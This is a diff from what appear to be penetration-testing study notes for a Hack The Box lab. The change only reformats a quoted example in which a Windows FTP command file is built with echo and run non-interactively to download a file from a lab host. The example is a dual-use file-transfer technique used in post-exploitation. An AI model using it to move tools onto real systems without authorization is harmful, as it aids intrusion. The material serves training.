@@ -120,22 +120,22 @@ You can't access this shared folder because your organization's security policie
 > If that's the case, we can create an FTP command file to download a file. 
 > First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
 > Create a Command File for the FTP Client and Download the Target File:
-```
-C:\htb> echo open 192.168.49.128 > ftpcommand.txt
-C:\htb> echo USER anonymous >> ftpcommand.txt
-C:\htb> echo binary >> ftpcommand.txt
-C:\htb> echo GET file.txt >> ftpcommand.txt
-C:\htb> echo bye >> ftpcommand.txt
-C:\htb> ftp -v -n -s:ftpcommand.txt
-ftp> open 192.168.49.128
-Log in with USER and PASS first.
-ftp> USER anonymous
-
-ftp> GET file.txt
-ftp> bye
-
-C:\htb>more file.txt
-This is a test file
-```
+> ```
+> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+> C:\htb> echo USER anonymous >> ftpcommand.txt
+> C:\htb> echo binary >> ftpcommand.txt
+> C:\htb> echo GET file.txt >> ftpcommand.txt
+> C:\htb> echo bye >> ftpcommand.txt
+> C:\htb> ftp -v -n -s:ftpcommand.txt
+> ftp> open 192.168.49.128
+> Log in with USER and PASS first.
+> ftp> USER anonymous
+> 
+> ftp> GET file.txt
+> ftp> bye
+> 
+> C:\htb>more file.txt
+> This is a test file
+> ```
 
 
